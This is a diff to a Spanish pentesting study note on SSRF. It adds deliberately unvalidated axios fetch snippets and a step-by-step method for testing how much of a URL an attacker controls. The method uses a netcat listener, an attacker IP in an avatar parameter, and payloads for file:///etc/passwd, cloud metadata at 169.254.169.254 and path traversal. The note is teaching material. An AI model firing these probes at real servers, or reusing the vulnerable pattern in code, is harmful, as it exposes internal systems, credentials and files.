@@ -23,10 +23,69 @@ La clave es **dónde está el servidor**. <mark style="background: #FFB86CA6;">E
 No todas las SSRF rinden igual. Lo que determina el alcance es qué parte de la URL es nuestra:
 
 - **URL completa** (`?url=https://...`): control total. El caso ideal —podemos cambiar host, puerto y esquema—.
+```javascript
+// El servidor recibe el input del usuario
+const userInput = req.query.url;
+
+// El servidor hace la petición directamente a lo que introdujiste
+const response = await axios.get(userInput);
+```
 - **Solo el host/dominio** (la app fija el esquema y la ruta): aún sirve para apuntar a hosts internos, pero limita los trucos de esquema.
-- **Solo la ruta** (host fijo): el más restringido; a veces explotable con [[05 - Evasión de defensas SSRF|path traversal o confusión de parser]].
+```javascript
+// El esquema (https://) y la ruta (/api/status) están fijados
+const userInput = req.query.dominio;
+
+// Tu input se concatena en medio de la URL base
+const target = 'https://' + userInput + '/api/status';
+const response = await axios.get(target);
+```
+- **Solo la ruta** (host fijo): el más restringido. El servidor sabe exactamente a qué máquina y con qué protocolo conectarse, y solo usa tu _input_ para buscar un recurso específico. A veces explotable con [[05 - Evasión de defensas SSRF|path traversal o confusión de parser]].
+```javascript
+// El servidor apunta a una API interna con una estructura fija
+const baseURL = 'http://api.backend-interno.local/v1/recursos/';
+const userInput = req.query.archivo;
+
+// Tu input solo se añade al final de la ruta
+const target = baseURL + userInput;
+const response = await axios.get(target);
+```
 
 <mark style="background: #FFB8EBA6;">Antes de elegir payload, identifica qué porción controlas</mark>: decide qué técnicas tienes disponibles.
+
+## ¿Cómo identificar qué porción controlamos?
+En la práctica, la forma de clasificar el nivel de control consiste en **enviar la petición a un escuchador bajo tu control (OOB)** (como `netcat` o `interactsh`) y observar qué recibe tu servidor.
+
+### Método práctico de clasificación
+- **Paso 1: Probar si controlas la URL completa**
+    - _Payload:_ <mark style="background: #ADCCFFA6;">Envías una URL absoluta con protocolo</mark>: `http://TU-IP-OOB:8000/prueba`.
+    - _Resultado:_ Si en tu escuchador entra exactamente `GET /prueba HTTP/1.1`, o si al cambiar el protocolo a `file:///etc/passwd` lee el archivo local, controlas la **URL completa**.
+- **Paso 2: Probar si solo controlas el Host/Dominio**
+    - _Payload:_ <mark style="background: #ADCCFFA6;">Envías solo tu IP o dominio sin protocolo</mark>: `TU-IP-OOB:8000`.
+    - _Resultado:_ Si en tu escuchador entra una petición del tipo `GET /api/v1/fetch HTTP/1.1` (con una ruta fija que tú no escribiste), la app concatena tu entrada en medio (`http://` + `INPUT` + `/ruta_fija`). Solo controlas el **Host/Dominio**.
+- **Paso 3: Probar si solo controlas la Ruta**
+    - _Payload:_ <mark style="background: #ADCCFFA6;">Si intentar meter tu IP externa falla o no genera ninguna conexión OOB</mark>, pruebas una<mark style="background: #FFB86CA6;"> ruta relativa o absoluta</mark>: `/admin.php` o `../admin.php`.
+    - _Resultado:_ Si la <mark style="background: #FF5582A6;">aplicación responde devolviendo el contenido del recurso interno</mark>, el backend tiene el Host fijo (`http://servidor-interno/` + `INPUT`). Solo controlas la **Ruta**.
+
+### Ejemplo práctico en un entorno real
+Imagina que interceptas un parámetro `?avatar=...` en Burp Suite y tienes `netcat` escuchando en tu máquina (`nc -lnvp 8000`).
+
+```HTTP
+POST /user/profile HTTP/1.1
+Host: app-vulnerable.com
+Content-Type: application/x-www-form-urlencoded
+
+avatar=http://10.10.14.5:8000/test
+```
+
+1. **Prueba A:** Envías `avatar=http://10.10.14.5:8000/test`.
+    - _En Netcat entra:_ `GET /test HTTP/1.1`.
+    - _Diagnóstico:_ **URL completa**. Tienes total libertad para probar esquemas como `gopher://` o `file://`.
+2. **Prueba B:** Si la prueba A devuelve un error de "URL inválida", pruebas enviar `avatar=10.10.14.5:8000`.
+    - _En Netcat entra:_ `GET /images/default.png HTTP/1.1`.
+    - _Diagnóstico:_ **Solo Host/Dominio**. El código backend hace algo como `'https://' + input + '/images/default.png'`. No puedes usar `file://`, pero podrías intentar apuntar a `169.254.169.254` si esa ruta fija existe en el endpoint de metadatos.
+3. **Prueba C:** Si las conexiones externas no llegan a tu Netcat, pruebas `avatar=/admin`.
+    - _Respuesta en Burp:_ La aplicación devuelve el HTML del panel de administración interno.
+    - _Diagnóstico:_ **Solo Ruta**. El backend apunta a un servidor interno fijo (`http://internal-api/` + `input`). Quedas limitado a _path traversal_ (`../../admin`) o a buscar otros endpoints en ese host.
 
 # Los esquemas de URL: la segunda palanca
 
